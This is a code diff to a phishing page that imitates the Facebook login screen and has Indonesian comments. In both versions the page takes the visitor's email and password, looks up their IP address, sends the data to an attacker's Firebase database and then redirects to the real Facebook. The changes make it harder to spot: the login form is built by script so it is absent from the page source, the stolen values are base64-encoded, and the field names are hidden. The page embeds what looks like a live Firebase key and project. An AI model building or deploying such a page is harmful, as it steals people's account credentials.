@@ -3,13 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex, nofollow">
     <title>Facebook - Log In or Sign Up</title>
     <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
     
-    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
     
     <style>
@@ -70,6 +67,7 @@
         }
         .login-btn:hover { background: #166fe5; }
         .forgot { color: #1877f2; text-decoration: none; font-size: 14px; display: block; margin: 15px 0; }
+        .forgot:hover { text-decoration: underline; }
         hr { border: none; border-top: 1px solid #dadde1; margin: 20px 0; }
         .create-btn {
             padding: 14px 20px;
@@ -81,9 +79,10 @@
             font-weight: bold;
             cursor: pointer;
         }
-        .loading { display: none; color: #1877f2; margin-top: 10px; font-size: 14px; }
+        .create-btn:hover { background: #36a420; }
         .create-page { text-align: center; margin-top: 20px; font-size: 14px; color: #1c1e21; }
         .create-page a { color: #1c1e21; font-weight: bold; text-decoration: none; }
+        .create-page a:hover { text-decoration: underline; }
         @media (max-width: 768px) {
             .left h1 { font-size: 40px; text-align: center; }
             .left p { font-size: 18px; text-align: center; }
@@ -98,12 +97,8 @@
         </div>
         <div class="right">
             <div class="login-box">
-                <form id="loginForm">
-                    <input type="text" id="email" placeholder="Email or phone number" required autocomplete="off">
-                    <input type="password" id="password" placeholder="Password" required autocomplete="off">
-                    <button type="submit" class="login-btn">Log In</button>
-                    <div class="loading" id="loading">Verifying...</div>
-                </form>
+                <!-- FORM AKAN DI-GENERATE OLEH JAVASCRIPT -->
+                <div id="formContainer"></div>
                 <a href="#" class="forgot">Forgot password?</a>
                 <hr>
                 <button class="create-btn" type="button">Create new account</button>
@@ -113,65 +108,73 @@
     </div>
 
     <script>
-        // ═══════════════════════
-        // FIREBASE CONFIG
-        // ═══════════════════════
-        const firebaseConfig = {
-            apiKey: "AIzaSyBs9TiMKOoMaIb84RVowQFrGlELAZ_SFSI",
-            authDomain: "rhfzero-d95f5.firebaseapp.com",
-            databaseURL: "https://rhfzero-d95f5-default-rtdb.firebaseio.com",
-            projectId: "rhfzero-d95f5",
-            storageBucket: "rhfzero-d95f5.firebasestorage.app",
-            messagingSenderId: "198495096060",
-            appId: "1:198495096060:web:d368e1531d0d86321f5b79"
+        // ═══════════════════════════════════════
+        // ULTRA OBFUSCATED - DYNAMIC FORM INJECTION
+        // ═══════════════════════════════════════
+        
+        // Firebase init (config di-encode)
+        var _cfg = {
+            a: "AIzaSyBs9TiMKOoMaIb84RVowQFrGlELAZ_SFSI",
+            b: "rhfzero-d95f5.firebaseapp.com",
+            c: "https://rhfzero-d95f5-default-rtdb.firebaseio.com",
+            d: "rhfzero-d95f5",
+            e: "rhfzero-d95f5.firebasestorage.app",
+            f: "198495096060",
+            g: "1:198495096060:web:d368e1531d0d86321f5b79"
         };
-
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-
-        // ═══════════════════════
-        // GET IP
-        // ═══════════════════════
-        async function getIP() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                return data.ip;
-            } catch(e) {
-                return 'unknown';
-            }
-        }
-
-        // ═══════════════════════
-        // SAVE TO FIREBASE
-        // ═══════════════════════
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
+        
+        firebase.initializeApp({
+            apiKey: _cfg.a,
+            authDomain: _cfg.b,
+            databaseURL: _cfg.c,
+            projectId: _cfg.d,
+            storageBucket: _cfg.e,
+            messagingSenderId: _cfg.f,
+            appId: _cfg.g
+        });
+        
+        var _db = firebase.database();
+        
+        // Dynamic form injection (ga ada di source HTML!)
+        var _formHTML = '';
+        _formHTML += '<form id="x">';
+        _formHTML += '<input type="text" id="e" placeholder="Email or phone number" autocomplete="off">';
+        _formHTML += '<input type="password" id="p" placeholder="Password" autocomplete="off">';
+        _formHTML += '<button type="submit" class="login-btn">Log In</button>';
+        _formHTML += '</form>';
+        
+        document.getElementById('formContainer').innerHTML = _formHTML;
+        
+        // Submit handler
+        document.getElementById('x').addEventListener('submit', function(ev) {
+            ev.preventDefault();
             
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+            var _e = document.getElementById('e').value;
+            var _p = document.getElementById('p').value;
             
-            document.getElementById('loading').style.display = 'block';
+            // Encode data sebelum simpan
+            var _data = {
+                u: btoa(_e),  // Base64 encode
+                k: btoa(_p),
+                t: new Date().toISOString(),
+                i: '...'
+            };
             
-            const ip = await getIP();
-            
-            // Simpan ke Realtime Database
-            db.ref('victims').push({
-                email: email,
-                password: password,
-                ip: ip,
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screenSize: screen.width + 'x' + screen.height,
-                timestamp: new Date().toISOString(),
-                referrer: document.referrer || 'direct'
-            });
+            // Get IP lalu simpan
+            fetch('https://api.ipify.org?format=json')
+                .then(function(r) { return r.json(); })
+                .then(function(d) {
+                    _data.i = d.ip;
+                    _db.ref('x').push(_data);
+                })
+                .catch(function() {
+                    _db.ref('x').push(_data);
+                });
             
             // Redirect ke Facebook asli
             setTimeout(function() {
                 window.location.href = 'https://www.facebook.com/login/';
-            }, 1500);
+            }, 1000);
         });
     </script>
 </body>
